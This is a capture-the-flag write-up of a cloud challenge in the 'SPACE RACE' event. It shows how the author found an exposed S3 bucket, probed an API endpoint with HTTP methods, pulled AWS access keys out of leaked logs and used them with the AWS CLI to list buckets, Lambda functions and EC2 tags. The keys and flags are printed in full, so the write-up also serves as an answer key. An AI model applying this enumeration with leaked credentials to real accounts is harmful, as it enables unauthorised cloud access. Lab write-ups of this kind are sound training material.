# Enumerating the cloud
beginner | cloud | 125 points

The spaceship that you will use in SPACE RACE is almost ready. One of the last steps is to verify that all of the systems are operational. Unfortunately, the AI controlling the system information decided to take a personal time off for a few days, leaving you without an easy access to the spaceship systems. This is not a problem because, as the cyber security specialist in the ship, you know the spaceship cloud infrastructure like the back of your hand.

## [25 points] Spaceship external information endpoint
>Your spaceship is located [here](http://planet-bucket-43b2a07.s3-website-eu-west-1.amazonaws.com), can you find the external information panel?

Checking the source code of the page reveals another S3 bucket, [rocket-bucket-723aa76](https://rocket-bucket-723aa76.s3.amazonaws.com).

The bucket contains 3 files:
- external-information-panel.txt
- flag.txt
- rocket_bucket.png

Downloading **flag.txt** provides the flag for this sub-challenge. The external information panel file will be useful for the next sub-challenge.

Flag: `CTF{0841862f273fd2ca20ea3b94a645781071ab19d7}`

## [25 points] Obtaining the spaceship access keys
>You have gained access to the external infromation endpoint. Can you access the spaceship logs to obtain the access keys?

The external information panel contains a link to the [spaceship logs](https://g0341x75tb.execute-api.eu-west-1.amazonaws.com/logs). 

Visiting the page returns a **405** request which says that the GET method is not permitted. I immediately started looking for ways to bypass this error, only to find nothing for a long long time. 

Then something struck and I decided to check the response header, which contained the status code 200? Interesting. So the "method not permitted" response is actually a fake 405 response? Looks like. 

The next train of thought went to trying other HTTP methods apart from GET, which I did using `curl -X <method> <url>`.

```
piyagehi@Piyas-MacBook-Pro:~$ curl -X POST https://g0341x75tb.execute-api.eu-west-1.amazonaws.com/logs
405 Request method 'POST' not allowed
piyagehi@Piyas-MacBook-Pro:~$ curl -X PUT https://g0341x75tb.execute-api.eu-west-1.amazonaws.com/logs
The periscope data is optimal. Have a flag for your effort: CTF{9177a9c8bb1cd5c85934}.<br>
[
    {
        "Id": "dfa0f62de13a1719d125ac2f3382543067701c5031289006c8170d3bab33994a",
        "Created": "2021-06-24T17:33:58.623969048Z",
...
```

Nice!

Flag: `CTF{9177a9c8bb1cd5c85934}`

## [25 points] A cleaning bucket
>You have managed to access the spaceship. You see a cleaning bucket, the Lambda Thrusters information panel tag and the E-space Computing Cloud system tags. What does the tag in the cleaning bucket says?

Somewhere in the spaceship logs, AWS credentials can be found.

```
"Env": [
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "AWS_SECRET_ACCESS_KEY=dpmlpQnMgZFZ5Nt8k7AkCTizqGrY84ZRW55lo+52",
    "AWS_ACCESS_KEY_ID=AKIA552OOUKCBWDIUCWS"
],
```

So we set up AWS CLI with these credentials to view further information. An brief introduction to AWS Access Keys is mentioned in the writeup for [TEASER: Locked out](https://github.com/pjg11/CTF-Writeups/blob/main/2021-Space-Race/1-Locked-Out.md#configure-aws-credentials).

```
$ aws configure --profile=enum-cloud
AWS Access Key ID [None]: AKIA552OOUKCBWDIUCWS
AWS Secret Access Key [None]: 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
Default region name [None]: eu-west-1
Default output format [None]: 
$ aws s3 ls
2021-06-24 20:21:57 cleaningbucket-cf2be35
2021-06-24 20:25:07 planet-bucket-43b2a07
2021-06-24 20:24:40 rocket-bucket-723aa76
$ aws s3 ls cleaningbucket-cf2be35
# No result
```

Oh, no result. I went back through the challenge description again, which mentions of some tag. Some searching later, I found a function called [`get_bucket_tagging`](https://docs.aws.amazon.com/cli/latest/reference/s3api/get-bucket-tagging.html) which can be used to get tags for a bucket.

```
$ aws s3api get-bucket-tagging --bucket cleaningbucket-cf2be35
{
    "TagSet": [
        {
            "Key": "hackyholidays",
            "Value": "users"
        },
        {
            "Key": "Flag",
            "Value": "CTF 855cc724fd34896c8875"
            "Key": "Next",
            "Value" : "Lambda Thrusters"
        }
    ]
}
```

## [25 points] Lambda Thrusters information panel
>What is the tag in the Lambda Thrusters information panel?

[AWS Lambda](https://docs.aws.amazon.com/cli/latest/reference/lambda/index.html) is another feature that can be accessed within the AWS CLI. Getting the tag for the lambda function requires its Resource Number, which we can get from the `list-functions` method.

```
$ aws lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "l-1-eb3b962",
            "FunctionArn": "arn:aws:lambda:eu-west-1:957405373060:function:l-1-eb3b962"
            "Runtime": "nodejs12.x"
            "Role": "arn:aws:iam::957405373060:role/lambdaRole-79ced9b",
            "Handler": "index.handler",
            "CodeSize": 2604,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified":"2021-06-28T09:08:03.833+0000",
            "CodeSha256": "YvuySpl61W1DkDhn/q8T5Uk56Y5zLYBJz8CfdUZ6/Lw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "fac84b7c-e7aa-4d02-a242-bdb5234a2eba",
            "PackageType": "Zip"
        },
        {
            "FunctionName": "lambdaThrusters-8697c51",
            "FunctionArn": "arn:aws:lambda:eu-west-1:957405373060:function:lambdaThrusters-8697c51",
            "Runtime": "nodejs12.x",
            "Role": "arn:aws:iam::957405373060:role/lambdaRole-f644005",
            "Handler": "index.handler",
            "CodeSize": 489,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2021-06-24T19:22:07.161+0000",
            "CodeSha256" : "jAtPTIMlihi2fSOsE63+ay10qw5xv8rNiCSV+PvIScY=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough",
            }
            "RevisionId": "62b3c862-46e8-4e29-91b9-31c25625ab26",
            "PackageType": "Zip"
        }
    ]
}
```

We need the tag for the second function, `lambdaThrusters-8697c51`, which we can get with the `list-tags` method. This contains the flag for this challenge.

```
$ aws lambda list-tags --resource arn:aws:lambda:eu-west-1:957405373060:function:lambdaThrusters-8697c51
{
    "Tags": {
        "Flag": "CTF_20324408a4e3f5c1d54",
        "Next": "E-Space Computing Cloud System",
        "hackyholidays": "users"
    }
}
```

Flag: `CTF_20324408a4e3f5c1d54`

## [25 points] E-space Cloud Computing System
What is the tag in the E-space Cloud Computing System?

If you've noticed, each task name has been related to some feature of AWS. This one is based on [EC2](https://docs.aws.amazon.com/cli/latest/reference/ec2/index.html) or Elastic Compute Cloud. EC2 contains a `describe_tags` method, which gives us the final flag for the challenge.

```console
$ aws ec2 describe-tags
{
    "Tags": [
        {
            "Key": "final_flag",
            "ResourceId": "i-09d9eff674a6e336b",
            "ResourceType": "instance",
            "Value": "CTF_98f960b4d86bbcfe3fe1",
        },
        {
            "Key": "hackyholidays",
            "ResourceId": "i-09d9eff674a6e336b",
            "ResourceType": "instance",
            "Value": "users",
        },
        {
            "Key": "hackyholidays",
            "ResourceId": "eni-08fe3290679e72178",
            "ResourceType": "network-interface",
            "Value": "users",
        },
        {
            "Key": "hackyholidays",
            "ResourceId": "vpc-042829c2c5370a038",
            "ResourceType": "vpc",
            "Value": "users",
        },
        {
            "Key": "hackyholidays",
            "ResourceId": "subnet-0f45a2d9daeeb4af9",
            "ResourceType": "subnet",
            "Value": "users",
        },
    ]
}
```

Flag: `CTF_98f960b4d86bbcfe3fe1`